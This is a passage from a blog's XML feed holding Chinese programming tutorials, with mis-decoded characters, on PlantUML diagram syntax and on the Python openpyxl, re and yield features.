å…¥äº†<code>together</code>å’Œ<code>-[hidden]-</code>æ¥æ”¯æŒè¾…åŠ©å¸ƒå±€</p><h3 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml namespace</span><span class="line"></br></span><span class="line">class net.Network &#123;</span><span class="line">    int address</span><span class="line"></br></span><span class="line">    ip_prefix()</span><span class="line">&#125;</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/1-3.png"></p><h2 id="æ—¶åºå›¾"><a href="#æ—¶åºå›¾" class="headerlink" title="æ—¶åºå›¾"></a>æ—¶åºå›¾</h2><p><img src="/2021/11/03/PlantUML/2-1.png"></p><ul><li>++ æ¿€æ´»ç›®æ ‡ï¼ˆå¯é€‰æ‹©åœ¨åé¢åŠ ä¸Š#colorï¼‰</li><li>â€“ æ’¤é”€æ¿€æ´»æº</li><li>** åˆ›å»ºç›®æ ‡å®ä¾‹</li><li>!! æ‘§æ¯ç›®æ ‡å®ä¾‹</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">alice -&gt; bob ++: hello</span><span class="line">bob -&gt; bob ++: self call</span><span class="line">bob -&gt; bib ++ #green: hello</span><span class="line">bob -&gt; george **: **create**</span><span class="line">return done</span><span class="line">return rc</span><span class="line">bob -&gt; george !! : delete</span><span class="line">return succuse</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/2-2.png"></p><p>é”šç‚¹å’ŒæŒç»­æ—¶é—´</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">!pragma teoz true</span><span class="line"></br></span><span class="line">&#123;start&#125; Alice -&gt; Bob : start doing things during duration</span><span class="line">Bob -&gt; Max : something</span><span class="line">Max -&gt; Bob : something else</span><span class="line">&#123;end&#125; Bob -&gt; Alice : finish</span><span class="line"></br></span><span class="line">&#123;start&#125; &lt;-&gt; &#123;end&#125; : some time</span><span class="line"></br></span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/2-3.png"></p><h2 id="ç”¨ä¾‹å›¾"><a href="#ç”¨ä¾‹å›¾" class="headerlink" title="ç”¨ä¾‹å›¾"></a>ç”¨ä¾‹å›¾</h2><p><img src="/2021/11/03/PlantUML/3-1.png"></p><p><img src="/2021/11/03/PlantUML/3-2.png"></p><h2 id="æ´»åŠ¨å›¾"><a href="#æ´»åŠ¨å›¾" class="headerlink" title="æ´»åŠ¨å›¾"></a>æ´»åŠ¨å›¾</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line"></br></span><span class="line">start</span><span class="line">:ClickServlet.handleRequest();</span><span class="line">:new page;</span><span class="line">if (Page.onSecurityCheck) then (true)</span><span class="line">  :Page.onInit();</span><span class="line">  if (isForward?) then (no)</span><span class="line">    :Process controls;</span><span class="line">    if (continue processing?) then (no)</span><span class="line">      stop</span><span class="line">    endif</span><span class="line"></br></span><span class="line">    if (isPost?) then (yes)</span><span class="line">      :Page.onPost();</span><span class="line">    else (no)</span><span class="line">      :Page.onGet();</span><span class="line">    endif</span><span class="line">    :Page.onRender();</span><span class="line">  endif</span><span class="line">else (false)</span><span class="line">endif</span><span class="line"></br></span><span class="line">if (do redirect?) then (yes)</span><span class="line">  :redirect process;</span><span class="line">else</span><span class="line">  if (do forward?) then (yes)</span><span class="line">    :Forward request;</span><span class="line">  else (no)</span><span class="line">    :Render page template;</span><span class="line">  endif</span><span class="line">endif</span><span class="line"></br></span><span class="line">stop</span><span class="line"></br></span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/4-1.png"></p><p><img src="/2021/11/03/PlantUML/4-2.png"></p><h2 id="ç»„ä»¶å›¾"><a href="#ç»„ä»¶å›¾" class="headerlink" title="ç»„ä»¶å›¾"></a>ç»„ä»¶å›¾</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">title **ç»„ä»¶å›¾**</span><span class="line"></br></span><span class="line">package &quot;ServiceLayer&quot; &#123;</span><span class="line">    [MessageBus] as bus</span><span class="line">    bus -&gt; [Handlers]</span><span class="line">    component &quot;Unit of Work&quot; &#123;</span><span class="line">        [Abstract UoW] as abuow</span><span class="line">        abuow &lt;|. [SQLA UoW]</span><span class="line">    &#125;</span><span class="line">    [Handlers] -&gt; abuow</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">cloud cloud</span><span class="line">cloud --&gt; [API]</span><span class="line"></br></span><span class="line">[API] --&gt; bus : Commands</span><span class="line">[Eventconsumer] --&gt; bus : Commands</span><span class="line"></br></span><span class="line">[API] --&gt; [Bootstrap]</span><span class="line">[Eventconsumer] --&gt; [Bootstrap]</span><span class="line">[Bootstrap] --&gt; bus</span><span class="line"></br></span><span class="line"></br></span><span class="line">package &quot;Adapters&quot; &#123;</span><span class="line">    component &quot;Repositories&quot; &#123;</span><span class="line">        [Abstract Repository] as abrepo</span><span class="line">        abrepo &lt;|. [SQLA Repository]</span><span class="line">    &#125;</span><span class="line">    [Redis\nEvent\nPublisher] as redis</span><span class="line">    [etc]</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">abuow --&gt; abrepo</span><span class="line">[SQLA UoW] --&gt; [SQLA Repository]</span><span class="line"></br></span><span class="line"></br></span><span class="line">package &quot;Domain&quot; &#123;</span><span class="line">    [Aggregate] -&gt; [Entity]</span><span class="line">    [Entity] --&gt; [Value Object]</span><span class="line">    [Event]</span><span class="line">    [Command]</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">Adapters -&gt; Domain</span><span class="line"></br></span><span class="line">database database</span><span class="line"></br></span><span class="line">[External Message Broker] as ex_message</span><span class="line">ex_message --&gt; [Eventconsumer]</span><span class="line">ex_message &lt;-- redis</span><span class="line"></br></span><span class="line">[SQLA Repository] --&gt; database</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/5-1.png"></p><p><img src="/2021/11/03/PlantUML/5-2.png"></p><h2 id="çŠ¶æ€å›¾"><a href="#çŠ¶æ€å›¾" class="headerlink" title="çŠ¶æ€å›¾"></a>çŠ¶æ€å›¾</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">state choice1 &lt;&lt;choice&gt;&gt;</span><span class="line">state fork1   &lt;&lt;fork&gt;&gt;</span><span class="line">state join2   &lt;&lt;join&gt;&gt;</span><span class="line">state end3    &lt;&lt;end&gt;&gt;</span><span class="line"></br></span><span class="line">[*]     --&gt; choice1 : from start\nto choice</span><span class="line">choice1 --&gt; fork1   : from choice\nto fork</span><span class="line">choice1 --&gt; join2   : from choice\nto join</span><span class="line">choice1 --&gt; end3    : from choice\nto end</span><span class="line"></br></span><span class="line">fork1   ---&gt; State1 : from fork\nto state</span><span class="line">fork1   --&gt; State2  : from fork\nto state</span><span class="line"></br></span><span class="line">State2  --&gt; join2   : from state\nto join</span><span class="line">State1  --&gt; [*]     : from state\nto end</span><span class="line"></br></span><span class="line">join2   --&gt; [*]     : from join\nto end</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/6-1.png"></p><p><img src="/2021/11/03/PlantUML/6-2.png"></p><h2 id="å¯¹è±¡å›¾"><a href="#å¯¹è±¡å›¾" class="headerlink" title="å¯¹è±¡å›¾"></a>å¯¹è±¡å›¾</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">object London</span><span class="line">object Washington</span><span class="line">object Berlin</span><span class="line">object NewYork</span><span class="line"></br></span><span class="line">map CapitalCity &#123;</span><span class="line"> UK *-&gt; London</span><span class="line"> USA *--&gt; Washington</span><span class="line"> Germany *---&gt; Berlin</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">NewYork --&gt; CapitalCity::USA</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/7-1.png"></p><h2 id="æ€ç»´å¯¼å›¾"><a href="#æ€ç»´å¯¼å›¾" class="headerlink" title="æ€ç»´å¯¼å›¾"></a>æ€ç»´å¯¼å›¾</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startmindmap</span><span class="line">caption figure 1</span><span class="line">title My super title</span><span class="line"></br></span><span class="line">* &lt;&amp;flag&gt;Debian</span><span class="line">** &lt;&amp;globe&gt;Ubuntu</span><span class="line">*** Linux Mint</span><span class="line">*** Kubuntu</span><span class="line">*** Lubuntu</span><span class="line">*** KDE Neon</span><span class="line">** &lt;&amp;graph&gt;LMDE</span><span class="line">** &lt;&amp;pulse&gt;SolydXK</span><span class="line">** &lt;&amp;people&gt;SteamOS</span><span class="line">** &lt;&amp;star&gt;Raspbian with a very long name</span><span class="line">*** &lt;s&gt;Raspmbc&lt;/s&gt; =&gt; OSMC</span><span class="line">*** &lt;s&gt;Raspyfi&lt;/s&gt; =&gt; Volumio</span><span class="line"></br></span><span class="line">left side</span><span class="line"></br></span><span class="line">** Windows 95</span><span class="line">** Windows 98</span><span class="line">** Windows NT</span><span class="line">*** Windows 8</span><span class="line">*** Windows 10</span><span class="line"></br></span><span class="line"></br></span><span class="line">header</span><span class="line">My super header</span><span class="line">endheader</span><span class="line"></br></span><span class="line">center footer My super footer</span><span class="line"></br></span><span class="line">legend right</span><span class="line">  Short</span><span class="line">  legend</span><span class="line">endlegend</span><span class="line">@endmindmap</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/8-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plantuml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python excelæ¨¡å—</title>
      <link href="/2021/10/25/python-excel%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/10/25/python-excel%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>python ä¸­ä½¿ç”¨execlæ¨èä½¿ç”¨<code>openpyxl</code>æ¨¡å—</p><h2 id="åˆ›å»ºè¡¨å’Œä¿å­˜"><a href="#åˆ›å»ºè¡¨å’Œä¿å­˜" class="headerlink" title="åˆ›å»ºè¡¨å’Œä¿å­˜"></a>åˆ›å»ºè¡¨å’Œä¿å­˜</h2><h3 id="åˆ›å»ºæ–°è¡¨"><a href="#åˆ›å»ºæ–°è¡¨" class="headerlink" title="åˆ›å»ºæ–°è¡¨"></a>åˆ›å»ºæ–°è¡¨</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">wb = pyopenxl.Workbook() <span class="hljs-comment"># åˆ›å»ºæ–°Excel</span></span><span class="line">sheet = wb.active  <span class="hljs-comment"># è·å–æ¿€æ´»çš„è¡¨ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ª</span></span></code></pre></div></div><h3 id="åŠ è½½å·²æœ‰çš„Excel"><a href="#åŠ è½½å·²æœ‰çš„Excel" class="headerlink" title="åŠ è½½å·²æœ‰çš„Excel"></a>åŠ è½½å·²æœ‰çš„Excel</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">wb = pyopenxl.load_workbook(filename=<span class="hljs-string">&#x27;path.xlsx&#x27;</span>)</span><span class="line">sheet = wb[<span class="hljs-string">&#x27;Sheet1&#x27;</span>] <span class="hljs-comment"># è·å–è¡¨</span></span></code></pre></div></div><h3 id="ä¿®æ”¹è¡¨å"><a href="#ä¿®æ”¹è¡¨å" class="headerlink" title="ä¿®æ”¹è¡¨å"></a>ä¿®æ”¹è¡¨å</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">sheet.title = <span class="hljs-string">&#x27;new_sheet_name&#x27;</span></span></code></pre></div></div><h3 id="ä¿å­˜"><a href="#ä¿å­˜" class="headerlink" title="ä¿å­˜"></a>ä¿å­˜</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">wb.save(<span class="hljs-string">&#x27;path.xlsx&#x27;</span>)</span></code></pre></div></div><h2 id="è¿­ä»£å™¨"><a href="#è¿­ä»£å™¨" class="headerlink" title="è¿­ä»£å™¨"></a>è¿­ä»£å™¨</h2><p>è¡Œè¿­ä»£å™¨</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows(min_row=<span class="hljs-number">1</span>, max_row=sheet.max_row, min_col=<span class="hljs-number">1</span>, max_col=<span class="hljs-number">3</span>):</span><span class="line">    <span class="hljs-keyword">for</span> cell <span class="hljs-keyword">in</span> row:</span><span class="line">        ...</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python reæ¨¡å—</title>
      <link href="/2021/10/22/python-re%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/10/22/python-re%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://docs.python.org/zh-cn/3/howto/regex.html">å®˜æ–¹ä¸­æ–‡æ–‡æ¡£</a></li></ul><h2 id="re-æ¨¡å—ä¸‹çš„å¸¸ç”¨æ–¹æ³•"><a href="#re-æ¨¡å—ä¸‹çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="re æ¨¡å—ä¸‹çš„å¸¸ç”¨æ–¹æ³•"></a>re æ¨¡å—ä¸‹çš„å¸¸ç”¨æ–¹æ³•</h2><ul><li>æŸ¥æ‰¾æ‰€æœ‰</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.findall(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;alvin yuan&#x27;</span>)</span></code></pre></div></div><p>è¿”å›æ‰€æœ‰æ»¡è¶³åŒ¹é…æ¡ä»¶çš„ç»“æœ, æ”¾åœ¨åˆ—è¡¨é‡Œ</p><ul><li>æŸ¥æ‰¾ï¼ˆåªåˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ï¼‰</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.search(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;alvin yuan&#x27;</span>).group()</span></code></pre></div></div><p>å‡½æ•°ä¼šåœ¨å­—ç¬¦ä¸²å†…æŸ¥æ‰¾æ¨¡å¼åŒ¹é…, åªåˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ç„¶åè¿”å›ä¸€ä¸ªåŒ…å«åŒ¹é…ä¿¡æ¯çš„å¯¹è±¡, è¯¥å¯¹è±¡å¯ä»¥<br>é€šè¿‡è°ƒç”¨<code>group()</code>æ–¹æ³•å¾—åˆ°åŒ¹é…çš„å­—ç¬¦ä¸², å¦‚æœå­—ç¬¦ä¸²æ²¡æœ‰åŒ¹é…ï¼Œåˆ™è¿”å›<code>None</code>ã€‚</p><ul><li>æŸ¥æ‰¾ï¼ˆä»…åœ¨å­—ç¬¦ä¸²å¼€å§‹å¤„è¿›è¡ŒåŒ¹é…ï¼‰</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.match(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>).group()</span></code></pre></div></div><p>åŒ<code>search</code>, ä¸è¿‡ä»…åœ¨å­—ç¬¦ä¸²å¼€å§‹å¤„è¿›è¡ŒåŒ¹é…</p><ul><li>å°†æŸ¥æ‰¾çš„å†…å®¹ä½œä¸ºè¿­ä»£å™¨</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">&#x27;\d&#x27;</span>,<span class="hljs-string">&#x27;ds3sy4784a&#x27;</span>):</span><span class="line">    <span class="hljs-built_in">print</span>(match.group())</span></code></pre></div></div><ul><li>åˆ†å‰²</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">ret=re.split(<span class="hljs-string">&#x27;[ab]&#x27;</span>,<span class="hljs-string">&#x27;abcd&#x27;</span>)</span></code></pre></div></div><p>å…ˆæŒ‰â€™aâ€™åˆ†å‰²â€™aâ€™çš„å·¦è¾¹æ— å†…å®¹ï¼Œåˆ™å·¦è¾¹å¾—åˆ°â€™â€™å’Œå³è¾¹â€™bcdâ€™, åœ¨å¯¹â€™â€™å’Œâ€™bcdâ€™åˆ†åˆ«æŒ‰â€™bâ€™åˆ†å‰²</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-built_in">print</span>(ret)<span class="hljs-comment">#[&#x27;&#x27;, &#x27;&#x27;, &#x27;cd&#x27;]</span></span></code></pre></div></div><ul><li>æ›¿æ¢</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">ret=re.sub(<span class="hljs-string">&#x27;\d&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;alvin5yuan6&#x27;</span>,<span class="hljs-number">1</span>)</span></code></pre></div></div><p><code>re.sub(å‚ 1, å‚ 2, å‚ 3, å‚ 4) </code>å‚ 1 è¡¨ç¤ºåŒ¹é…è§„åˆ™æˆ–å­—ç¬¦ï¼Œå‚ 2 è¡¨ç¤ºè¦æ›¿æ¢æˆçš„å­—ç¬¦ä¸²ï¼Œå‚ 3 è¡¨ç¤ºè¢«åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå‚ 4 è¡¨ç¤ºæŒ‡å®šåŒ¹é…æ¬¡æ•°</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.subn(<span class="hljs-string">&#x27;\d&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;alvin5yuan6&#x27;</span>)</span></code></pre></div></div><p>è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œåˆ†åˆ«ä¸ºæ›¿æ¢åå­—ç¬¦ä¸²ï¼Œå’Œæœ¬æ¬¡æ›¿æ¢çš„æ¬¡æ•°</p><ul><li>ç¼–è¯‘ï¼ˆè‡ªå®šä¹‰è§„åˆ™ï¼‰å¯é‡å¤ä½¿ç”¨</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">obj=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;\d&#123;3&#125;&#x27;</span>)            <span class="hljs-comment">#è¿”å›ä¸€ä¸ªè§„åˆ™å¯¹è±¡</span></span><span class="line">ret=obj.search(<span class="hljs-string">&#x27;abc123eeee&#x27;</span>)      <span class="hljs-comment">#è§„åˆ™å¯¹è±¡å¯ä»¥è°ƒç”¨.search()  .findallç­‰æ–¹æ³• </span></span><span class="line"><span class="hljs-built_in">print</span>(ret.group())<span class="hljs-comment">#123</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python yield è¯¦è§£</title>
      <link href="/2021/10/18/python-yield-%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/10/18/python-yield-%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>è¦ç†è§£<code>yield</code>ï¼Œé¦–å…ˆè¦æ¸…æ¥šåœ¨æœ‰yieldçš„å‡½æ•°ï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œå…¶å®è¿”å›çš„ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ã€‚ç„¶åé€šè¿‡<code>next()</code>æ‰§è¡Œåˆ°yieldè¯­å¥åœä¸‹ï¼Œå¹¶è¿”å›yieldæ‰€è·Ÿçš„å€¼ï¼Œç„¶åä¸€ç›´ç­‰å¾…<code>next()</code>çš„æ‰§è¡Œ</p><ul><li><code>iterable</code> å¯è¿­ä»£å¯¹è±¡, å®ç°äº†<code>__iter__</code> çš„å¯¹è±¡</li><li><code>iterator</code> è¿­ä»£å™¨, å®ç°äº† <code>__iter__</code> å’Œ <code>__next__</code> çš„å¯¹è±¡</li><li><code>generator</code> ç”Ÿæˆå™¨</li><li><code>yield</code> <code>__next__()</code> æ–¹æ³•çš„ä¼˜é›…å½¢å¼</li></ul><h2 id="ç®€å•çš„ä¾‹å­"><a href="#ç®€å•çš„ä¾‹å­" class="headerlink" title="ç®€å•çš„ä¾‹å­"></a>ç®€å•çš„ä¾‹å­</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;starting...&quot;</span>)</span><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line">        res = <span class="hljs-keyword">yield</span> <span class="hljs-number">4</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;res:&quot;</span>,res)</span><span class="line">g = foo()</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g))</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*&quot;</span>*<span class="hljs-number">20</span>)</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g))</span></code></pre></div></div><p>è¾“å‡ºï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-markdown codeBlockLines"><span class="line">starting...</span><span class="line">4</span><span class="line"><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span></span><span class="line">res: None</span><span class="line">4</span></code></pre></div></div><p>æµç¨‹æ˜¯ï¼š</p><ol><li><code>g = foo()</code>å¾—åˆ°çš„æ˜¯ç”Ÿæˆå™¨å¯¹è±¡ï¼Œè¿˜å¹¶æ²¡æœ‰æ‰§è¡Œã€‚</li><li><code>next((g))</code>æ‰§è¡Œgç”Ÿæˆå™¨çŸ¥é“yieldè¯­å¥ï¼Œå¹¶è¿”å›4ã€‚</li><li>æ‰“å°<code>*</code></li><li><code>next(g)</code>ç»§ç»­æ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰<code>send()</code>ç»™å‡ºå€¼ï¼Œæ‰€æœ‰resä¸ºNone</li></ol><p>å¦‚æœæƒ³è¦è®©resè·å¾—å€¼ï¼Œé‚£ä¹ˆå°†ç¬¬äºŒä¸ª<code>next(g)</code>æ¢æˆ<code>next(g,5)</code>ï¼Œè¿™æ ·reså°±å¯ä»¥è·å¾—å€¼5ã€‚æˆ–è€…<code>g.send(5)</code>ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p><h2 id="forå¾ªç¯"><a href="#forå¾ªç¯" class="headerlink" title="forå¾ªç¯"></a>forå¾ªç¯</h2><p>å¦‚æœä¸€æ¬¡æ¬¡çš„è°ƒç”¨<code>next()</code>æœªå…ä¹Ÿå¤ªè¿‡éº»çƒ¦äº†ï¼Œå¤§å¤šæ•°æƒ…å†µå¯ä»¥ä½¿ç”¨<code>for()</code>æ¥éå†ç”Ÿæˆå™¨ã€‚ä¹Ÿæ ·ä¹Ÿå¯é¿å…ä½¿ç”¨<code>StopIteration</code>å¼‚å¸¸æ¥åœæ­¢éå†ã€‚</p><h2 id="withè¯­å¥"><a href="#withè¯­å¥" class="headerlink" title="withè¯­å¥"></a>withè¯­å¥</h2><p>ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span></span><span class="line">        self.name = name</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Query info about %s...&#x27;</span> % self.name)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@contextmanager</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_query</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Begin&#x27;</span>)</span><span class="line">    q = Query(name)</span><span class="line">    <span class="hljs-keyword">yield</span> q</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;End&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">with</span> create_query(<span class="hljs-string">&#x27;Bob&#x27;</span>) <span class="hljs-keyword">as</span> q:</span><span class="line">    q.query()</span></code></pre></div></div><p>è¾“å‡ºï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-mathematica codeBlockLines"><span class="line"><span class="hljs-built_in">Begin</span></span><span class="line"><span class="hljs-built_in">Query</span> <span class="hljs-variable">info</span> <span class="hljs-variable">about</span> <span class="hljs-variable">Bob</span><span class="hljs-operator">...</span></span><span class="line"><span class="hljs-built_in">End</span></span></code></pre></div></div><h2 id="yield-from"><a href="#yield-from" class="headerlink" title="yield from"></a>yield from</h2><p>çœ‹ä¸ªä¾‹å­</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g1</span>():</span>     </span><span class="line">     <span class="hljs-keyword">yield</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g2</span>():</span></span><span class="line">     <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)</span><span class="line"></br></span><span class="line">it1 = g1()</span><span class="line">it2 = g2()</span><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> it1:</span><span class="line">    <span class="hljs-built_in">print</span>(x)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> it2:</span><span class="line">    <span class="hljs-built_in">print</span>(x)</span></code></pre></div></div><p>è¾“å‡º:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stylus codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-title">range</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)</span></span></span><span class="line"><span class="hljs-number">0</span></span><span class="line"><span class="hljs-number">1</span></span><span class="line"><span class="hljs-number">2</span></span><span class="line"><span class="hljs-number">3</span></span><span class="line"><span class="hljs-number">4</span></span></code></pre></div></div><p>å¯ä»¥çŸ¥é“yieldè¿”å›çš„æ˜¯å¯è¿­ä»£å¯¹è±¡ï¼Œè€Œ<code>yield from</code>è¿”å›çš„æ˜¯è¿­ä»£å™¨æ‰§è¡Œåæ¯ä¸ªitemã€‚</p><p><strong>æ‰€ä»¥<code>yield from iterable</code>çš„æœ¬è´¨å°±æ˜¯<code>for item in iterable: yield item</code></strong></p><h2 id="å–è¿”å›å€¼"><a href="#å–è¿”å›å€¼" class="headerlink" title="å–è¿”å›å€¼"></a>å–è¿”å›å€¼</h2><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿­ä»£å™¨æ˜¯æ— æ³•è·å–åˆ°è¿”å›å€¼çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼è·å–</p><ol><li>ä½¿ç”¨<code>StopIteration</code>å¼‚å¸¸</li><li>ä½¿ç”¨ç±»ï¼Œç„¶åå–ç±»çš„å˜é‡</li></ol><h3 id="ä½¿ç”¨StopIteration"><a href="#ä½¿ç”¨StopIteration" class="headerlink" title="ä½¿ç”¨StopIteration"></a>ä½¿ç”¨<code>StopIteration</code></h3><div 